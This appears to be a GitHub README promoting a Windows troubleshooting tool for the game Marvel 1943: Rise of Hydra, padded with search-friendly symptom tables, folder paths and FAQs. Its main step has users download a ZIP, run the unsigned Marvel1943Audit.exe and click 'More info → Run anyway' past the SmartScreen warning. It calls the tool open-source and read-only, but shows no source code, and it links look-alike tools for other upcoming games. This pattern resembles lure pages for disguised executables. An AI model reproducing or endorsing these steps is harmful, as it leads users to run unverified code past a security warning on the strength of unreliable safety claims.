<p align="center">
  <img src="https://i.postimg.cc/Jh8hcGVH/banner.png" alt="Marvel 1943 Shader & Config Audit — UE5 Shader Cache, VRAM & Save Checks for Windows" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-UE5%20Shader%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-marvel1943--audit--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Marvel 1943 Shader & Config Audit — UE5 Shader Cache, VRAM & Save Checks for Windows

**Marvel 1943: Rise of Hydra freezing during shader compilation or stuttering in cinematic action sequences on Windows PC? Inspect your Local AppData configs, system drive headroom, and save paths before reinstalling.**

Marvel 1943 Shader & Config Audit focuses on Skydance New Media's Unreal Engine 5 PC release: **high-fidelity MetaHuman characters, Nanite environments, and DirectX 12 shader caches write to `%LOCALAPPDATA%\Marvel1943\Saved`** and require adequate `C:` disk space and VRAM headroom.

This project is aimed at **Marvel 1943: Rise of Hydra on Windows PC (Steam & Epic)**. It concerns `%LOCALAPPDATA%\Marvel1943\Saved` configuration backups, DX12 shader-cache storage checks, crash log inspection, and save-folder discovery—not modifying game files.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Shader warm-up screen freezes on launch | Insufficient free space on `C:` or outdated GPU driver | Check `C:` free space (15–20 GB) and update GPU drivers |
| Frame drops in dense Paris / Wakanda scenes | Ultra textures / Ray Tracing exceeding 8 GB–12 GB VRAM | Check GPU VRAM headroom and adjust shadow/RT presets |
| D3D12 crash toggling Frame Generation or HDR | Corrupted display flags in `GameUserSettings.ini` | Back up and reset `%LOCALAPPDATA%\Marvel1943\Saved\Config\Windows` |
| Finding local campaign saves before patches | Saves stored in `%LOCALAPPDATA%` separate from Steam/Epic | Back up `%LOCALAPPDATA%\Marvel1943\Saved\SaveGames` |

## Download for Windows

[**Download Marvel1943Audit.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/Marvel1943Audit.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `Marvel1943Audit.exe`? (Automatic checks in ~2 seconds)

- Locates `%LOCALAPPDATA%\Marvel1943\Saved` and verifies `GameUserSettings.ini` and `Engine.ini`.
- Checks free space on drive `C:` where Unreal Engine 5 writes DirectX 12 shader caches.
- Scans `Saved\Logs` for `D3D12` or `Out of video memory` error entries.
- Finds local save files in `Saved\SaveGames` and reports GPU VRAM capacity.

### Sample Diagnostic Output

```text
[Marvel1943Audit] Inspecting Marvel 1943 UE5 Saved directory & VRAM...
[OK]   Saved Path       : C:\Users\Player\AppData\Local\Marvel1943\Saved
[OK]   GameUserSettings : Found (3.3 KB, writable)
[OK]   Saved\Logs       : 0 D3D12 or memory errors detected
[OK]   SaveGames        : 4 save slots found
[OK]   System Drive C:  : 67.4 GB free
```

The release ZIP is named `Marvel1943Audit.zip`; the Windows executable inside is named `Marvel1943Audit.exe`.

1. Close Marvel 1943: Rise of Hydra before moving or checking game files.
2. Click **Download Marvel1943Audit.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `Marvel1943Audit.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Marvel 1943: Rise of Hydra and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit), a Windows PC installation of Marvel 1943: Rise of Hydra, and DirectX 12 compatible GPU drivers.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `Marvel1943Audit.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Shader compilation screen hangs or takes several minutes on startup

UE5 compiles DirectX 12 Pipeline State Objects into `%LOCALAPPDATA%` on `C:`. Low system-drive space or an outdated graphics driver can stall shader warm-up.

### Frame drops and VRAM pressure during dense Paris/Wakanda set-pieces

Exceeding 8 GB–12 GB VRAM buffers with Ultra textures or Ray Tracing forces Windows to swap assets over system RAM, causing sharp frametime spikes.

### D3D12 crash to desktop when toggling Frame Generation or HDR

Corrupted display flags in `Saved\Config\Windows\GameUserSettings.ini` can prevent clean startup until backed up and reset.

### Finding and backing up local campaign saves before patches

Keeping a dated offline copy of `%LOCALAPPDATA%\Marvel1943\Saved\SaveGames` protects your campaign progress.

## Where Marvel 1943: Rise of Hydra files normally belong

On Windows PC, local settings, crash logs, and save slots live inside `%LOCALAPPDATA%\Marvel1943\Saved`:

```text
%LOCALAPPDATA%\Marvel1943\Saved\
```

Inside that structure, key files and subdirectories typically look like this:

```text
%LOCALAPPDATA%\Marvel1943\Saved\
├── Config\
│   └── Windows\
│       ├── GameUserSettings.ini
│       └── Engine.ini
├── Logs\
└── SaveGames\
```

Keep a dated backup of `SaveGames` and `GameUserSettings.ini` before testing custom `Engine.ini` settings.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Close Marvel 1943: Rise of Hydra completely.** Verify the shipping executable is no longer running in Task Manager.
2. **Back up `%LOCALAPPDATA%\Marvel1943\Saved`.** Copy `SaveGames` and `Config\Windows` to a dated folder in Documents.
3. **Check free space on drive `C:`.** Ensure at least 15–20 GB of free system-drive space for DX12 shader caches.
4. **Update GPU drivers to the latest 2026 release.** Install current NVIDIA Game Ready or AMD Adrenalin drivers.
5. **Inspect `Saved\Logs` for `D3D12` or `Out of video memory` warnings.** Check recent log files to isolate VRAM limits from driver timeouts.
6. **Verify installed files in Steam / Epic.** Repair any damaged `.pak` or `.ucas` files.
7. **Restart the game and let shader warm-up finish.** Allow initial shader compilation to complete before loading a mission.

### Before moving any files

Copy `%LOCALAPPDATA%\Marvel1943\Saved\SaveGames` to Documents before resetting `Config\Windows`.

## What an effective diagnostic report should tell you

A clear diagnostic check locates **`%LOCALAPPDATA%\Marvel1943\Saved` configs and saves**, checks `C:` drive free space, detects `Saved\Logs` errors, and reports GPU VRAM headroom.

## FAQ

**Where are Marvel 1943: Rise of Hydra save files stored on Windows?**

Inside `%LOCALAPPDATA%\Marvel1943\Saved\SaveGames\`.

**Where are Marvel 1943's graphics config files located?**

At `%LOCALAPPDATA%\Marvel1943\Saved\Config\Windows\GameUserSettings.ini`.

**Why does Marvel 1943 stutter on first launch?**

Unreal Engine 5 compiles DirectX 12 shaders dynamically on first run and after GPU driver updates.

**Does this tool modify game binaries or unlock outfits?**

No. It performs read-only inspection of local configuration, log, and save folders.

**Are any copyrighted game files bundled here?**

No game binaries or assets are included in this repository.

## Useful reading

- [Skydance Games Official Website](https://www.skydance.com/games)
- [Marvel 1943: Rise of Hydra on Steam](https://store.steampowered.com/search/?term=Marvel+1943+Rise+of+Hydra)

## More Windows Game Diagnostic Tools

- [GearsEDay-UE5StutterDoctor](../GearsEDay-UE5StutterDoctor) — Gears of War: E-Day UE5 DX12 stutter & config doctor
- [DeathStranding2-PCCacheDoctor](../DeathStranding2-PCCacheDoctor) — Death Stranding 2 PC Decima shader cache & save doctor
- [Fable2026-ShaderCrashGuard](../Fable2026-ShaderCrashGuard) — Fable (2026) ForzaTech shader optimization & crash guard
- [Stalker2-ShaderCacheGuard](../Stalker2-ShaderCacheGuard) — S.T.A.L.K.E.R. 2 UE5 shader compilation & `C:` space check

*Independent community project. Not affiliated with Skydance New Media, Marvel Entertainment, Valve, or Steam. All trademarks belong to their respective owners.*
